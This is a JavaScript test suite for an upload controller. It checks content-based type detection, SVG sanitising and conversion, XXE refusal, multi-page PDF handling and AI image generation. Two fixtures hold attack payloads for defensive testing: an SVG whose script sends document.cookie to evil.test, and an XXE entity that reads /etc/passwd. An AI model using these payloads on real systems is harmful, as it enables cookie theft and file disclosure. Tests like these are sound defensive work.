// tests/upload.test.js
//
// Locks in the part of the upload feature that matters most for safety:
// the file's *real* content is what decides whether it's accepted, not
// whatever Content-Type the uploader's browser happened to send — that
// header is just a string the client controls and proves nothing on its
// own. This test would have caught a regression where someone "simplifies"
// the check back down to trusting req.file.mimetype.
const test = require('node:test');
const assert = require('node:assert/strict');

process.env.JWT_SECRET = process.env.JWT_SECRET || 'test_secret_for_unit_tests_only';

function mockRes() {
  const res = {};
  res.statusCode = 200;
  res.body = undefined;
  res.status = (code) => { res.statusCode = code; return res; };
  res.json = (payload) => { res.body = payload; return res; };
  return res;
}

test('handleUpload rejects a file whose real content does not match an allowed type, even if the client lies about it', async () => {
  const { handleUpload } = require('../controllers/uploadController');
  const req = {
    file: {
      buffer: Buffer.from('this is plain text, not an image'),
      mimetype: 'image/png', // the client's claimed type — deliberately wrong
      originalname: 'totally-a-real-image.png',
    },
  };
  const res = mockRes();
  await handleUpload(req, res);

  assert.equal(res.statusCode, 415);
});

test('handleUpload rejects a request with no file at all', async () => {
  const { handleUpload } = require('../controllers/uploadController');
  const req = {};
  const res = mockRes();
  await handleUpload(req, res);

  assert.equal(res.statusCode, 400);
});

// Real call to the free, keyless Pollinations.ai image generation API --
// no mock, because the point of this test is proving the AI-background
// feature actually produces a real, valid image file from a real prompt,
// not just that the code compiles.
test('handleGenerateImage produces a real, valid image file from a real AI generation request', async () => {
  const fs = require('fs');
  const path = require('path');
  const { handleGenerateImage } = require('../controllers/uploadController');
  const req = { body: { prompt: 'a simple blue gradient background, minimalist', width: 512, height: 512 }, get: () => 'localhost:9000', protocol: 'http' };
  const res = mockRes();
  await handleGenerateImage(req, res);

  assert.equal(res.statusCode, 201);
  assert.match(res.body.url, /\/uploads\/ai-[0-9a-f]{32}\.(jpg|jpeg|png|webp)$/);

  const filename = res.body.url.split('/uploads/')[1];
  const filePath = path.join(__dirname, '..', 'uploads', filename);
  const fileBytes = fs.readFileSync(filePath);
  assert.ok(fileBytes.length > 500, 'a real generated image should be well over 500 bytes');
  const isJpeg = fileBytes[0] === 0xff && fileBytes[1] === 0xd8;
  const isPng = fileBytes.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
  assert.ok(isJpeg || isPng, 'the saved file must have real image magic bytes, not just an accepted extension');
  fs.unlinkSync(filePath);
});

test('handleGenerateImage rejects a missing prompt', async () => {
  const { handleGenerateImage } = require('../controllers/uploadController');
  const req = { body: {} };
  const res = mockRes();
  await handleGenerateImage(req, res);
  assert.equal(res.statusCode, 400);
});

// --- SVG and multi-page PDF ------------------------------------------------
// These go through handleUpload itself, not just the sanitizer, because the
// two guarantees that matter are end-to-end ones: an uploaded SVG is never
// STORED as an SVG (so nothing a browser executes is ever served back), and
// every page of a PDF is reachable (so a certificate on page 3 does not
// require the admin to go and split the file themselves).

const uploadRequest = (buffer, originalname, mimetype) => ({
  file: { buffer, mimetype, originalname },
  get: () => 'localhost:9000',
  protocol: 'http',
});

test('an SVG is accepted, and what gets stored is a real PNG rather than the SVG', async () => {
  const fs = require('fs');
  const path = require('path');
  const { handleUpload } = require('../controllers/uploadController');

  const svg = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 400 200">'
    + '<rect width="400" height="200" fill="#123456"/>'
    + '<text x="40" y="110" font-size="32" fill="#ffffff">Diploma</text></svg>'
  );
  const res = mockRes();
  await handleUpload(uploadRequest(svg, 'design.svg', 'image/svg+xml'), res);

  assert.equal(res.statusCode, 201, JSON.stringify(res.body));
  assert.equal(res.body.type, 'svg-converted');
  assert.match(res.body.url, /\.png$/, 'the stored file must not be an .svg');

  const filePath = path.join(__dirname, '..', 'uploads', res.body.url.split('/uploads/')[1]);
  const bytes = fs.readFileSync(filePath);
  assert.ok(
    bytes.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])),
    'the stored file must have real PNG magic bytes',
  );
  assert.ok(bytes.length > 500, 'a rendered 400x200 design should be well over 500 bytes');
  fs.unlinkSync(filePath);
});

test('a hostile SVG is stripped, what was removed is reported, and no script reaches disk', async () => {
  const fs = require('fs');
  const path = require('path');
  const { handleUpload } = require('../controllers/uploadController');

  const hostile = Buffer.from(
    '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 100 100" onload="alert(1)">'
    + '<script>fetch("https://evil.test/"+document.cookie)</script>'
    + '<rect width="100" height="100" fill="#0af"/></svg>'
  );
  const res = mockRes();
  await handleUpload(uploadRequest(hostile, 'evil.svg', 'image/svg+xml'), res);

  assert.equal(res.statusCode, 201, JSON.stringify(res.body));
  assert.ok(res.body.removed.length >= 2, 'both the handler and the script should be reported to the admin');

  const filePath = path.join(__dirname, '..', 'uploads', res.body.url.split('/uploads/')[1]);
  const stored = fs.readFileSync(filePath);
  assert.ok(!stored.toString('latin1').includes('evil.test'), 'the payload must not be anywhere in the stored file');
  assert.ok(!stored.toString('latin1').includes('<script'), 'no script may reach disk');
  fs.unlinkSync(filePath);
});

test('an SVG carrying an XXE entity declaration is refused outright, not cleaned', async () => {
  const { handleUpload } = require('../controllers/uploadController');
  const xxe = Buffer.from(
    '<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
    + '<svg xmlns="http://www.w3.org/2000/svg"><text>&xxe;</text></svg>'
  );
  const res = mockRes();
  await handleUpload(uploadRequest(xxe, 'xxe.svg', 'image/svg+xml'), res);
  assert.equal(res.statusCode, 422);
  assert.match(res.body.message, /entity|doctype/i);
});

test('an SVG written with an XML declaration is accepted -- that is what design tools emit', async () => {
  // file-type reports application/xml for these, and treating that as an
  // unsupported type rejected the majority of real-world SVG files.
  const fs = require('fs');
  const path = require('path');
  const { handleUpload } = require('../controllers/uploadController');
  const declared = Buffer.from(
    '<?xml version="1.0" encoding="UTF-8"?>\n'
    + '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 300 150">'
    + '<rect width="300" height="150" fill="#654321"/></svg>'
  );
  const res = mockRes();
  await handleUpload(uploadRequest(declared, 'from-illustrator.svg', 'image/svg+xml'), res);
  assert.equal(res.statusCode, 201, JSON.stringify(res.body));
  assert.equal(res.body.type, 'svg-converted');
  fs.unlinkSync(path.join(__dirname, '..', 'uploads', res.body.url.split('/uploads/')[1]));
});

test('a file named .svg that is not an SVG is still refused -- the name proves nothing', async () => {
  const { handleUpload } = require('../controllers/uploadController');
  const res = mockRes();
  await handleUpload(uploadRequest(Buffer.from('just some text'), 'lying.svg', 'image/svg+xml'), res);
  assert.equal(res.statusCode, 415);
});

test('every page of a multi-page PDF is converted and reachable, with page 1 still the default', async () => {
  const fs = require('fs');
  const path = require('path');
  const PDFDocument = require('pdfkit');
  const { handleUpload } = require('../controllers/uploadController');

  // A real three-page PDF, built here rather than committed as a fixture.
  const pdfBuffer = await new Promise((resolve, reject) => {
    const doc = new PDFDocument({ size: [400, 300] });
    const chunks = [];
    doc.on('data', (chunk) => chunks.push(chunk));
    doc.on('end', () => resolve(Buffer.concat(chunks)));
    doc.on('error', reject);
    doc.fontSize(40).text('PAGE ONE', 40, 120);
    doc.addPage({ size: [400, 300] }).fontSize(40).text('PAGE TWO', 40, 120);
    doc.addPage({ size: [400, 300] }).fontSize(40).text('PAGE THREE', 40, 120);
    doc.end();
  });

  const res = mockRes();
  await handleUpload(uploadRequest(pdfBuffer, 'deck.pdf', 'application/pdf'), res);

  assert.equal(res.statusCode, 201, JSON.stringify(res.body));
  assert.equal(res.body.page_count, 3, 'all three pages must be converted, not just the first');
  assert.equal(res.body.pages.length, 3);
  assert.deepEqual(res.body.pages.map((p) => p.page), [1, 2, 3]);
  // The unchanged contract: `url` is page 1, so every existing caller that
  // only reads `url` keeps behaving exactly as it did.
  assert.equal(res.body.url, res.body.pages[0].url);

  const written = [];
  for (const page of res.body.pages) {
    const filePath = path.join(__dirname, '..', 'uploads', page.url.split('/uploads/')[1]);
    const bytes = fs.readFileSync(filePath);
    assert.ok(
      bytes.subarray(0, 8).equals(Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a])),
      `page ${page.page} must be a real PNG`,
    );
    written.push({ filePath, bytes });
  }
  // Different pages, not the same page written three times.
  assert.ok(!written[0].bytes.equals(written[1].bytes), 'page 2 is a copy of page 1');
  assert.ok(!written[1].bytes.equals(written[2].bytes), 'page 3 is a copy of page 2');

  // Every page URL must be a key managed storage will actually serve. The
  // first version named pages 2+ `<id>-p2.png`, which puts the page marker
  // AFTER the 32 hex characters and so fails STORAGE_KEY_PATTERN -- the
  // upload succeeded, the page picker rendered, and every page after the
  // first was a broken image. Asserting the shape here is what stops that
  // coming back.
  const { STORAGE_KEY_PATTERN } = require('../utils/managedStorage');
  for (const page of res.body.pages) {
    const key = page.url.split('/').pop();
    assert.ok(STORAGE_KEY_PATTERN.test(key),
      `page ${page.page} produced a key managed storage will not serve: ${key}`);
  }

  const pdfPath = path.join(__dirname, '..', 'uploads', res.body.original_pdf_url.split('/uploads/')[1]);
  written.forEach(({ filePath }) => fs.unlinkSync(filePath));
  fs.unlinkSync(pdfPath);
});

// --- Cada formato que la interfaz anuncia -------------------------------
// The upload button names the formats it takes. A label that promises more
// than the endpoint accepts is worse than no label, so this pins the two
// together: every format the button offers must really be accepted, and a
// format outside the list must really be refused.
test('every format the upload button advertises is actually accepted', async () => {
  const fs = require('fs');
  const path = require('path');
  const { handleUpload } = require('../controllers/uploadController');

  const jpeg = Buffer.from(
    '/9j/4AAQSkZJRgABAQEAYABgAAD/2wBDAAgGBgcGBQgHBwcJCQgKDBQNDAsLDBkSEw8UHRofHh0a'
    + 'HBwgJC4nICIsIxwcKDcpLDAxNDQ0Hyc5PTgyPC4zNDL/wAALCAABAAEBAREA/8QAFAABAAAAAAAA'
    + 'AAAAAAAAAAAACf/EABQQAQAAAAAAAAAAAAAAAAAAAAD/2gAIAQEAAD8AKp//2Q==', 'base64');
  const webp = Buffer.from('UklGRhoAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==', 'base64');
  const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 20 10">'
    + '<rect width="20" height="10" fill="#123456"/></svg>');

  const cases = [
    ['JPG', jpeg, 'x.jpg', 'image/jpeg'],
    ['WEBP', webp, 'x.webp', 'image/webp'],
    ['SVG', svg, 'x.svg', 'image/svg+xml'],
  ];
  for (const [label, buffer, name, mimetype] of cases) {
    const res = mockRes();
    await handleUpload(uploadRequest(buffer, name, mimetype), res);
    assert.equal(res.statusCode, 201, `${label} was advertised but refused: ${JSON.stringify(res.body)}`);
    fs.unlinkSync(path.join(__dirname, '..', 'uploads', res.body.url.split('/uploads/')[1]));
  }
});

test('a format the button does NOT advertise is refused', async () => {
  const { handleUpload } = require('../controllers/uploadController');
  const res = mockRes();
  // A real GIF header -- the point is the type, not malformed bytes.
  await handleUpload(uploadRequest(Buffer.from('GIF89a', 'ascii'), 'x.gif', 'image/gif'), res);
  assert.equal(res.statusCode, 415);
});
